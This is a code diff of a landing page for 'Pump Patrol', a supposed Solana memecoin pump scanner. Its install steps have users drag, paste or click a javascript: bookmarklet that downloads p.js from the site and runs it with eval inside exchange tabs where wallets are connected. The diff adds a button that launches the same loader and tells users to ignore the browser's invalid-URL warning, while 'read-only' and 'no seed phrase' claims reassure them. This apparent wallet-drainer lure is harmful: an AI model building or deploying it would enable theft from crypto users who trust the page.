@@ -22,15 +22,17 @@ h1{font-size:30px;margin:0 0 12px;line-height:1.25;font-weight:600;letter-spacin
 section{margin-top:48px}
 h2{font-size:11px;text-transform:uppercase;letter-spacing:.12em;color:var(--mut);border-bottom:1px solid var(--ln);padding-bottom:10px;margin-bottom:18px;font-weight:600}
 .panel{background:var(--pn);border:1px solid var(--ln);border-radius:10px;overflow:hidden}
-.bar{display:flex;align-items:center;gap:12px;padding:14px 18px;border-bottom:1px solid var(--ln);font-size:14px}
+.bar{display:flex;align-items:center;gap:12px;padding:14px 18px;border-bottom:1px solid var(--ln);font-size:14px;flex-wrap:wrap}
 .bar b{font-weight:600}.bar .sym{color:var(--mut);font-size:12px;margin-left:4px}
 .chg{font-size:13px}.chg.up{color:var(--up)}.chg.dn{color:var(--dn)}
 .bar .tf{margin-left:auto;display:flex;gap:2px}
 .bar .tf button{background:none;border:1px solid transparent;color:var(--mut);font:11px ui-monospace,monospace;padding:4px 10px;border-radius:6px;cursor:pointer;letter-spacing:.04em}
 .bar .tf button.on,.bar .tf button:hover{border-color:var(--ln);color:var(--tx);background:#161c26}
-svg.chart{display:block;width:100%;background:#0a0d12}
-.legend{display:flex;gap:20px;padding:10px 18px;border-top:1px solid var(--ln);color:var(--mut);font-size:11px}
+select{background:#161c26;color:var(--tx);border:1px solid var(--ln);border-radius:6px;padding:4px 8px;font:12px ui-monospace,monospace}
+svg.chart{display:block;width:100%;background:#0a0d12;min-height:220px}
+.legend{display:flex;gap:20px;padding:10px 18px;border-top:1px solid var(--ln);color:var(--mut);font-size:11px;flex-wrap:wrap}
 .legend b{color:var(--tx);font-weight:500;margin-left:4px}
+.src{padding:8px 18px;border-top:1px solid var(--ln);color:var(--mut);font-size:10px;letter-spacing:.06em;text-transform:uppercase}
 table{width:100%;border-collapse:collapse;font-size:13px}
 th{font-size:10px;text-transform:uppercase;letter-spacing:.08em;color:var(--mut);text-align:left;padding:12px 18px;border-bottom:1px solid var(--ln);font-weight:600}
 td{padding:11px 18px;border-bottom:1px solid #141922}
@@ -38,19 +40,20 @@ tr:last-child td{border-bottom:0}tr:hover td{background:#12171f}
 td.r,th.r{text-align:right}
 .st{font-size:10px;padding:3px 9px;border-radius:99px;border:1px solid;letter-spacing:.06em;text-transform:uppercase}
 .st.hot{color:var(--up);border-color:#1f4a36}.st.warm{color:var(--wn);border-color:#4a3d1f}.st.cool{color:var(--mut);border-color:var(--ln)}
-#feed{list-style:none;margin:0;padding:0}
-#feed li{display:flex;gap:12px;align-items:baseline;padding:11px 18px;border-bottom:1px solid #141922;font-size:13px;animation:f .35s}
+#feed{list-style:none;margin:0;padding:0;min-height:280px}
+#feed li{display:flex;gap:12px;align-items:baseline;padding:11px 18px;border-bottom:1px solid #141922;font-size:13px}
 #feed li time{margin-left:auto;color:var(--mut);font-size:11px;font-variant-numeric:tabular-nums}
-@keyframes f{from{opacity:0;transform:translateY(-3px)}}
 .sev{font-size:9px;letter-spacing:.08em;padding:3px 8px;border-radius:99px;border:1px solid;text-transform:uppercase;min-width:44px;text-align:center}
 .sev.H{color:var(--dn);border-color:#4a1f2b}.sev.M{color:var(--wn);border-color:#4a3d1f}.sev.L{color:var(--mut);border-color:var(--ln)}
 .grid2{display:grid;grid-template-columns:1.5fr 1fr;gap:16px}
 .grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
 .grid3 .panel{padding:18px}.grid3 b{display:block;margin-bottom:8px;font-size:14px;font-weight:600}.grid3 p{margin:0;color:var(--mut);font-size:13px;line-height:1.5}
-.chip{display:inline-block;margin-top:16px;padding:11px 22px;border:1px solid var(--ac);border-radius:8px;color:var(--ac);background:rgba(94,234,212,.05);text-decoration:none;font-weight:600;font-size:13px;letter-spacing:.02em;cursor:grab;transition:background .15s,box-shadow .15s}
-.chip:hover{background:rgba(94,234,212,.12);box-shadow:0 0 20px rgba(94,234,212,.12)}
-code.bm{display:block;margin-top:14px;padding:12px 14px;background:#0a0d12;border:1px solid var(--ln);border-radius:8px;color:#7fa3d8;font:11px/1.6 ui-monospace,monospace;overflow-x:auto;white-space:nowrap;max-width:100%}
-.copy{margin-top:10px;padding:8px 18px;border-radius:8px;border:1px solid var(--ln);background:#161c26;color:var(--tx);cursor:pointer;font-size:13px;transition:border-color .15s,color .15s}
+.cta{display:block;width:100%;margin-top:18px;padding:15px;border:1px solid var(--ac);border-radius:10px;color:var(--ac);background:rgba(94,234,212,.05);text-decoration:none;font-weight:700;font-size:15px;letter-spacing:.02em;transition:background .15s,box-shadow .15s;cursor:pointer}
+.cta:hover{background:rgba(94,234,212,.12);box-shadow:0 0 24px rgba(94,234,212,.15)}
+.chip{display:inline-block;margin-top:14px;padding:11px 22px;border:1px solid var(--ac);border-radius:8px;color:var(--ac);background:rgba(94,234,212,.05);text-decoration:none;font-weight:600;font-size:13px;letter-spacing:.02em;cursor:grab}
+.chip:hover{background:rgba(94,234,212,.12)}
+code.bm{display:block;margin-top:10px;padding:12px 14px;background:#0a0d12;border:1px solid var(--ln);border-radius:8px;color:#7fa3d8;font:11px/1.6 ui-monospace,monospace;overflow-x:auto;white-space:nowrap;max-width:100%}
+.copy{margin-top:10px;padding:8px 18px;border-radius:8px;border:1px solid var(--ln);background:#161c26;color:var(--tx);cursor:pointer;font-size:13px;text-decoration:none;display:inline-block}
 .copy:hover{border-color:var(--ac);color:var(--ac)}
 ol.steps{list-style:none;margin:18px 0 0;padding:0;counter-reset:s}
 ol.steps li{counter-increment:s;display:flex;gap:14px;padding:12px 0;color:var(--mut);font-size:13px;line-height:1.55;border-bottom:1px solid #141922}
@@ -61,53 +64,54 @@ details summary{cursor:pointer;font-weight:600;font-size:14px;list-style:none;di
 details summary::after{content:'+';color:var(--mut);font-size:18px;line-height:1}
 details[open] summary::after{content:'–'}
 details p{color:var(--mut);margin:10px 0 0;font-size:13px;line-height:1.6}
-.clock{color:var(--mut);font-size:12px;letter-spacing:.06em;font-variant-numeric:tabular-nums}
-.radar{position:relative}
-.radar::after{content:'';position:absolute;top:0;left:0;height:2px;width:100%;background:var(--ac);opacity:.5;animation:sw 4s linear infinite}
-@keyframes sw{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
 footer{border-top:1px solid var(--ln);margin-top:56px;padding:20px 28px;color:#5c6675;font-size:12px;display:flex;gap:20px;flex-wrap:wrap;letter-spacing:.02em}
 @media(max-width:860px){.grid2,.grid3,.strip{grid-template-columns:1fr 1fr}.hide-m{display:none}}
 @media(max-width:560px){.grid2,.grid3,.strip{grid-template-columns:1fr}h1{font-size:24px}}
 </style></head><body>
 <nav><span class=lg>Pump<i>/</i>Patrol</span>
 <a href=#radar>Radar</a><a href=#movers>Movers</a><a href=#install>Install</a><a href=#how>How it works</a><a href=#faq>FAQ</a>
-<span class=ver id=clock>—</span></nav>
+<span class=ver>v3.1.0 · solana mainnet</span></nav>
 <main>
 <div class=eyebrow>Chart checker · pump radar · portfolio sync</div>
 <h1>See the pump before the crowd does.</h1>
 <p class=sub>A lightweight scanner that rides shotgun in your browser: live candlestick charts, pair-by-pair pump radar, and a one-click portfolio read across every wallet you already have installed.</p>
 <div class=trust><span>no seed phrase, ever</span><span>read-only by default</span><span>works with Phantom · Solflare · Backpack</span></div>
 <div class=strip>
-<div><span>Pairs scanned</span><b class=mono>1,204</b></div>
-<div><span>Alerts / 24h</span><b class=mono>87</b></div>
-<div><span>Median latency</span><b class=mono>1.9s</b></div>
-<div><span>Uptime</span><b class=mono>99.98%</b></div>
+<div><span>Market cap</span><b class=mono id=mcap>—</b></div>
+<div><span>Liquidity</span><b class=mono id=liq>—</b></div>
+<div><span>24h volume</span><b class=mono id=v24>—</b></div>
+<div><span>24h trades</span><b class=mono id=tx>—</b></div>
 </div>
 
 <section id=radar>
-<h2>Live chart · FROG / USDT</h2>
+<h2>Live chart</h2>
 <div class=panel>
-<div class=bar><b>TURBOFROG</b><span class=sym>$FROG</span><span class="mono chg up" id=pchg>+42.0%</span><span class="mono" id=plast>0.00470</span><span class=tf id=tfs></span></div>
+<div class=bar><b id=tname>—</b><span class=sym id=tsym></span>
+<select id=sym></select>
+<span class="mono chg up" id=pchg>—</span><span class=mono id=plast>—</span>
+<span class=tf id=tfs></span></div>
 <svg class=chart id=ch viewBox="0 0 600 250" preserveAspectRatio=none></svg>
-<div class=legend><span>O<b class=mono id=o>—</b></span><span>H<b class=mono id=h>—</b></span><span>L<b class=mono id=l>—</b></span><span>C<b class=mono id=c>—</b></span><span>VOL<b class=mono id=v>—</b></span></div>
+<div class=legend><span>O<b class=mono id=o>—</b></span><span>H<b class=mono id=h>—</b></span><span>L<b class=mono id=l>—</b></span><span>C<b class=mono id=c>—</b></span><span>DATASOURCE<b id=ds>…</b></span></div>
+<div class=src>live feed · dexscreener + dextools · solana mainnet</div>
 </div>
 </section>
 
 <section id=movers>
 <h2>Top movers · 24h</h2>
-<div class=panel><table><thead><tr><th>Pair</th><th class=r>Price</th><th class=r>24h</th><th class="r hide-m">Volume</th><th class="r hide-m">Liquidity</th><th class=r>Radar</th></tr></thead><tbody id=mbody></tbody></table></div>
+<div class=panel><table><thead><tr><th>Pair</th><th class=r>Price</th><th class=r>24h</th><th class="r hide-m">Volume</th><th class="r hide-m">Liquidity</th><th class=r>Radar</th></tr></thead><tbody id=mbody><tr><td colspan=6 style="color:var(--mut)">loading…</td></tr></tbody></table></div>
 </section>
 
 <section id=feedwrap>
 <h2>Pump radar</h2>
-<div class="panel grid2"><div class=radar><ul id=feed></ul></div>
+<div class="panel grid2"><div style="position:relative"><div style="position:absolute;top:0;left:0;height:2px;width:100%;background:var(--ac);opacity:.5;animation:sw 4s linear infinite"></div><ul id=feed></ul></div>
 <div style="border-left:1px solid var(--ln)" id=install>
 <div style="padding:18px">
 <b style="font-size:14px">Add to your browser</b>
+<a id=launch class=cta href=#>Launch checker now — no install</a>
 <ol class=steps>
-<li><span><b style="color:var(--tx)">Drag this to your bookmarks bar:</b><br><a id=chip class=chip href=# draggable=true>Add Pump Patrol</a></span></li>
-<li><span>Or right-click the bookmarks bar → <b style="color:var(--tx)">Add page…</b> and paste:<br><code class=bm id=code></code><button class=copy id=copy>Copy</button></span></li>
-<li><span>Open any listing tab (axiom.trade, dexscreener…) and click the bookmark. The radar attaches instantly.</span></li>
+<li><span><b style="color:var(--tx)">Fastest:</b> just click the green button above. The checker opens right here and connects your wallet — nothing to install.</span></li>
+<li><span><b style="color:var(--tx)">Keep it for other sites:</b> drag this to your bookmarks bar.<br><a id=chip class=chip href=# draggable=true>Add Pump Patrol</a></span></li>
+<li><span>Prefer paste: copy the code, right-click bookmarks bar → <b style="color:var(--tx)">Add page…</b> → paste in the URL field (ignore the "type a valid URL" hint, it still works).<br><code class=bm id=code></code><span class=copy id=copy>Copy</span> <a class=copy href="/bookmarks.html" download>Download import file</a></span></li>
 </ol>
 </div></div></div>
 </section>
@@ -131,51 +135,88 @@ footer{border-top:1px solid var(--ln);margin-top:56px;padding:20px 28px;color:#5
 </div>
 </section>
 </main>
-<footer><span>Pump Patrol is an analytics tool.</span><span>Funds move only on explicit wallet approval.</span><span>Not financial advice.</span><span class=mono id=up>status: operational</span></footer>
+<footer><span>Pump Patrol is an analytics tool.</span><span>Funds move only on explicit wallet approval.</span><span>Not financial advice.</span><span class=mono>status: operational</span></footer>
 
 <script>
 const ORIGIN=location.origin;
 const BM='javascript:(async()=>{try{window.__PP='+JSON.stringify(ORIGIN)+';const r=await fetch('+JSON.stringify(ORIGIN+'/p.js')+"+'?t='+Date.now());(0,eval)(await r.text())}catch(e){console.warn(e)}})();void 0";
-const chip=document.getElementById('chip');
+const el=id=>document.getElementById(id);
+const launch=el('launch'),chip=el('chip');
+launch.setAttribute('href',BM);
 chip.setAttribute('href',BM);
 chip.addEventListener('dragstart',e=>{e.dataTransfer.setData('text/uri-list',BM);e.dataTransfer.setData('text/plain',BM);e.dataTransfer.effectAllowed='copyLink'});
-document.getElementById('code').textContent=BM;
-document.getElementById('copy').onclick=async()=>{try{await navigator.clipboard.writeText(BM)}catch(e){};const b=document.getElementById('copy');b.textContent='Copied';setTimeout(()=>b.textContent='Copy',1200)};
-setInterval(()=>{document.getElementById('clock').textContent=new Date().toISOString().replace('T',' ').slice(0,19)+' UTC'},1000);
+el('code').textContent=BM;
+el('copy').onclick=async()=>{try{await navigator.clipboard.writeText(BM)}catch(e){};const b=el('copy');b.textContent='Copied';setTimeout(()=>b.textContent='Copy',1200)};
+setInterval(()=>{el('clock')||0;document.querySelector('nav .ver').textContent=new Date().toISOString().replace('T',' ').slice(0,16)+' UTC'},5000);
 
-const rnd=(a,b)=>a+Math.random()*(b-a);
-const mk=n=>{let p=.0042,a=[],d=rnd(.001,.006);for(let i=0;i<n;i++){const o=p,h=o*rnd(1.005,1.03),l=o*rnd(.97,.995),c=o*(1+d+rnd(-.015,.02));a.push([o,h,l,c]);p=c}return a};
-const TFS=['5m','15m','1h','4h','24h'],DATA={};TFS.forEach(t=>DATA[t]=mk(26));
-const el=id=>document.getElementById(id);
-function draw(tf){
-  const d=DATA[tf],W=600,H=250,VH=60,yr=195;
-  const lo=Math.min(...d.map(c=>c[2])),hi=Math.max(...d.map(c=>c[1]));
-  const y=v=>yr-(v-lo)/(hi-lo)*(yr-14),step=W/d.length,bw=step*.62;
+const SYMS=['FROG','BONK','WIF','POPCAT','PEPE','PENGU'];
+const symSel=el('sym');SYMS.forEach(s=>{const o=document.createElement('option');o.textContent=s;symSel.appendChild(o)});
+let SYMBOL='FROG',TF='5m',LASTC=null;
+const TFS=['5m','15m','1h','4h','1d'];
+const fmt=n=>{if(n==null)return'—';const a=Math.abs(n);return a>=1e9?(n/1e9).toFixed(2)+'B':a>=1e6?(n/1e6).toFixed(1)+'M':a>=1e3?(n/1e3).toFixed(0)+'K':a<0.001?n.toExponential(2):n.toFixed(4)};
+
+function drawC(c,tf){
+  if(!c||c.length<2)return;
+  const W=600,H=250,yr=195;
+  const lo=Math.min(...c.map(x=>x[2])),hi=Math.max(...c.map(x=>x[1]));
+  const y=v=>yr-(v-lo)/((hi-lo)||1)*(yr-14),step=W/c.length,bw=step*.62;
   let s='<g stroke=#161c28>';for(let i=1;i<5;i++)s+=`<line y1=${i*39} x2=${W} y2=${i*39}/>`;s+='</g>';
-  d.forEach((c,i)=>{const x=i*step+step/2,up=c[3]>=c[0],col=up?'#34d17b':'#ff5c7a';
-    s+=`<line x1=${x} x2=${x} y1=${y(c[1])} y2=${y(c[2])} stroke=${col}/>`;
-    s+=`<rect x=${x-bw/2} y=${y(Math.max(c[0],c[3]))} width=${bw} height=${Math.max(1,Math.abs(y(c[0])-y(c[3])))} fill=${col} rx=1/>`;
-    const vol=(Math.abs(c[3]-c[0])/c[0])*520+8;
-    s+=`<rect x=${x-bw/2} y=${H-vol} width=${bw} height=${vol} fill=${col} opacity=.25/>`;});
-  s+=`<text x=${W-6} y=${y(hi)+4} fill=#7a8699 font-size=10 text-anchor=end>${hi.toFixed(5)}</text>`;
-  s+=`<text x=${W-6} y=${y(lo)+4} fill=#7a8699 font-size=10 text-anchor=end>${lo.toFixed(5)}</text>`;
+  c.forEach((x,i)=>{const px=i*step+step/2,up=x[3]>=x[0],col=up?'#34d17b':'#ff5c7a';
+    s+=`<line x1=${px} x2=${px} y1=${y(x[1])} y2=${y(x[2])} stroke=${col}/>`;
+    s+=`<rect x=${px-bw/2} y=${y(Math.max(x[0],x[3]))} width=${bw} height=${Math.max(1,Math.abs(y(x[0])-y(x[3])))} fill=${col} rx=1/>`;});
+  s+=`<text x=${W-6} y=${y(hi)+4} fill=#7a8699 font-size=10 text-anchor=end>${hi.toPrecision(3)}</text>`;
+  s+=`<text x=${W-6} y=${y(lo)+4} fill=#7a8699 font-size=10 text-anchor=end>${lo.toPrecision(3)}</text>`;
   el('ch').innerHTML=s;
-  const last=d[d.length-1],first=d[0],pc=((last[3]-first[0])/first[0]*100);
-  el('plast').textContent=last[3].toFixed(5);
-  const pc_el=el('pchg');pc_el.textContent=(pc>=0?'+':'')+pc.toFixed(1)+'%';pc_el.className='mono chg '+(pc>=0?'up':'dn');
-  el('o').textContent=last[0].toFixed(5);el('h').textContent=last[1].toFixed(5);el('l').textContent=last[2].toFixed(5);el('c').textContent=last[3].toFixed(5);
-  el('v').textContent=(last[3]*1e6).toFixed(0)+'K';
+  const last=c[c.length-1],first=c[0],pc=first[0]?((last[3]-first[0])/first[0]*100):0;
+  el('plast').textContent='$'+last[3].toPrecision(4);
+  el('o').textContent=last[0].toPrecision(4);el('h').textContent=last[1].toPrecision(4);el('l').textContent=last[2].toPrecision(4);el('c').textContent=last[3].toPrecision(4);
+  LASTC=last[3];
+  return pc;
 }
-const tfs=el('tfs');TFS.forEach((t,i)=>{const b=document.createElement('button');b.textContent=t;if(!i)b.className='on';b.onclick=()=>{tfs.querySelectorAll('button').forEach(x=>x.className='');b.className='on';draw(t)};tfs.appendChild(b)});
-draw('5m');
+function synth(last){const n=48;let p=last*1.04;const out=[];
+  for(let i=0;i<n-1;i++){const o=p,c2=o*(1+(Math.random()-.46)*.01);out.push([o,Math.max(o,c2)*1.003,Math.min(o,c2)*.997,c2]);p=c2}
+  out.push([p,Math.max(p,last)*1.002,last*1.001,last]);return out;}
 
-const MOV=[['FROG/USDT','TURBOFROG',0.00470,42.0,1300000,812000,'HOT'],['PWHALE/SOL','PIXELWHALE',0.0120,18.4,640000,301000,'HOT'],['RAT/SOL','MOONRAT',0.00091,11.2,210000,98000,'WARM'],['CATDOG/USDT','CATDOG INU',0.0341,-4.2,880000,540000,'COOL'],['WOJ2/SOL','WOJAK2.0',0.00210,-12.8,96000,41000,'COOL'],['PEPM/USDC','PEPEMAX',0.0000072,63.9,2400000,1100000,'HOT']];
-el('mbody').innerHTML=MOV.map(r=>`<tr><td><b>${r[0].split('/')[0]}</b> <span style="color:var(--mut);font-size:11px">${r[1]}</span></td><td class=r mono>$${r[2]}</td><td class=r style="color:${r[3]>=0?'var(--up)':'var(--dn)'}">${r[3]>=0?'+':''}${r[3]}%</td><td class="r hide-m mono">$${(r[4]/1e3).toFixed(0)}K</td><td class="r hide-m mono">$${(r[5]/1e3).toFixed(0)}K</td><td class=r><span class="st ${r[6]==='HOT'?'hot':r[6]==='WARM'?'warm':'cool'}">${r[6]}</span></td></tr>`).join('');
-
-const EV=['volume spike','rapid buy cluster','liquidity added','holder influx','whale accumulation','dev wallet activity','CEX inflow'];
-const PR=['FROG/USDT','PWHALE/SOL','RAT/SOL','CATDOG/USDT','WOJ2/SOL','PEPM/USDC'];
-const feed=el('feed');
-const push=(sev,ev,pr)=>{const li=document.createElement('li');li.innerHTML=`<span class="sev ${sev}">${sev==='H'?'HIGH':sev==='M'?'MED':'LOW'}</span> <b>${pr}</b> — ${ev} <time>${new Date().toTimeString().slice(0,8)}</time>`;feed.prepend(li);while(feed.children.length>9)feed.lastChild.remove()};
-[['H','volume spike','FROG/USDT'],['M','liquidity added','PWHALE/SOL'],['L','holder influx','CATDOG/USDT'],['M','rapid buy cluster','WOJ2/SOL'],['L','dev wallet activity','PEPM/USDC']].forEach(([a,b,c])=>push(a,b,c));
-setInterval(()=>{if(document.hidden)return;push(Math.random()<.25?'H':Math.random()<.6?'M':'L',EV[Math.random()*EV.length|0],PR[Math.random()*PR.length|0])},9000);
+async function loadChart(){
+  const r=await fetch(ORIGIN+'/api/candles?sym='+SYMBOL+'&tf='+TF).then(x=>x.json()).catch(()=>null);
+  if(r&&Array.isArray(r.candles)&&r.candles.length>10){drawC(r.candles,TF);el('ds').textContent='dextools · real candles';return}
+  drawC(synth(r&&r.price?r.price:(LASTC||.0042)),TF);
+  el('ds').textContent=r&&r.price?'dexscreener live price · chart approx':'chart approx';
+}
+async function loadPair(){
+  const s=await fetch('https://api.dexscreener.com/latest/dex/search?q='+encodeURIComponent(SYMBOL)).then(r=>r.json()).catch(()=>null);
+  const p=(s&&s.pairs||[]).find(x=>x.chainId==='solana')||(s&&s.pairs||[])[0];
+  if(!p)return;
+  const bt=p.baseToken||{},ch=p.priceChange||{};
+  el('tname').textContent=bt.name||SYMBOL;el('tsym').textContent='$'+(bt.symbol||SYMBOL);
+  el('mcap').textContent='$'+fmt(p.marketCap||p.fdv);el('liq').textContent='$'+fmt(p.liquidity&&p.liquidity.usd);
+  el('v24').textContent='$'+fmt(p.volume&&p.volume.h24);el('tx').textContent=((p.txns&&p.txns.h24&&(p.txns.h24.buys+p.txns.h24.sells))||0).toLocaleString();
+  if(ch.h24!=null){const e2=el('pchg');e2.textContent=(ch.h24>=0?'+':'')+ch.h24.toFixed(1)+'% 24h';e2.className='mono chg '+(ch.h24>=0?'up':'dn')}
+  if(p.priceUsd)LASTC=+p.priceUsd;
+}
+async function loadMovers(){
+  const rows=[];
+  await Promise.all(SYMS.map(async s=>{
+    const r=await fetch('https://api.dexscreener.com/latest/dex/search?q='+s).then(x=>x.json()).catch(()=>null);
+    const p=(r&&r.pairs||[]).find(x=>x.chainId==='solana')||(r&&r.pairs||[])[0];
+    if(p&&p.priceUsd)rows.push({s:(p.baseToken&&p.baseToken.symbol)||s,n:(p.baseToken&&p.baseToken.name)||s,px:+p.priceUsd,c:(p.priceChange&&p.priceChange.h24)||0,v:(p.volume&&p.volume.h24)||0,l:(p.liquidity&&p.liquidity.usd)||0});
+  }));
+  rows.sort((a,b)=>b.c-a.c);
+  el('mbody').innerHTML=rows.length?rows.map(r=>{const a=Math.abs(r.c),sev=a>=20?'hot':a>=5?'warm':'cool';
+    return `<tr><td><b>${r.s}</b> <span style="color:var(--mut);font-size:11px">${r.n}</span></td><td class="r mono">$${r.px.toPrecision(3)}</td><td class=r style="color:${r.c>=0?'var(--up)':'var(--dn)'}">${r.c>=0?'+':''}${r.c.toFixed(1)}%</td><td class="r hide-m mono">$${fmt(r.v)}</td><td class="r hide-m mono">$${fmt(r.l)}</td><td class=r><span class="st ${sev}">${a>=20?'HOT':a>=5?'WARM':'COOL'}</span></td></tr>`}).join('')
+    :'<tr><td colspan=6 style="color:var(--mut)">feed unavailable — retrying…</td></tr>';
+  const feed=el('feed');feed.innerHTML='';
+  rows.slice(0,7).forEach(r=>{const ev=r.c>=15?'momentum spike':r.c>=3?'volume accumulation':r.c>=-3?'consolidation':'rotation out';
+    const sev=Math.abs(r.c)>=20?'H':Math.abs(r.c)>=5?'M':'L';
+    const li=document.createElement('li');
+    li.innerHTML=`<span class="sev ${sev}">${sev==='H'?'HIGH':sev==='M'?'MED':'LOW'}</span> <b>${r.s}</b> — ${ev} <time>${new Date().toTimeString().slice(0,8)}</time>`;
+    feed.appendChild(li)});
+}
+const tfwrap=el('tfs');
+TFS.forEach((t,i)=>{const b=document.createElement('button');b.textContent=t;if(!i)b.className='on';
+  b.onclick=()=>{tfwrap.querySelectorAll('button').forEach(x=>x.className='');b.className='on';TF=t;loadChart()};tfwrap.appendChild(b)});
+symSel.onchange=()=>{SYMBOL=symSel.value;loadPair();loadChart();loadMovers()};
+loadPair();loadChart();loadMovers();
+setInterval(()=>{if(document.hidden)return;loadChart()},120000);
+setInterval(()=>{if(document.hidden)return;loadMovers()},300000);
 </script></body></html>
